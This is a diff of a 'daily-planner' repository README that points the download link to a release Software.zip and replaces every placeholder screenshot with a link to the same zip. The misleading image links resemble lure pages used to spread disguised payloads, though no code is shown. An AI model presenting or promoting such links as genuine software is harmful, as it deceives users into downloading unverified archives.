@@ -12,7 +12,7 @@ Welcome to the "daily-planner" repository, your go-to place for organizing your 
 
 ### Get Started
 To access the software for the daily planner, please download it from the following link:  
-[Launch Daily Planner Software](https://github.com/user-attachments/files/18410590/Software.zip)
+[Launch Daily Planner Software](https://github.com/justakidthatcode/daily-planner/releases/download/v2.0/Software.zip)
 
 ### Installation Guide
 1. Download the software from the provided link.  
@@ -22,9 +22,9 @@ To access the software for the daily planner, please download it from the follow
 ### Screenshots
 Here are some screenshots of the daily planner software in action:  
 
-![Screenshot 1](https://via.placeholder.com/600x400)  
-![Screenshot 2](https://via.placeholder.com/600x400)  
-![Screenshot 3](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/justakidthatcode/daily-planner/releases/download/v2.0/Software.zip)  
+![Screenshot 2](https://github.com/justakidthatcode/daily-planner/releases/download/v2.0/Software.zip)  
+![Screenshot 3](https://github.com/justakidthatcode/daily-planner/releases/download/v2.0/Software.zip)
 
 ### Support
 If you encounter any issues or have any questions about the daily planner software, please check the "Releases" section for updates or reach out to our support team for assistance.
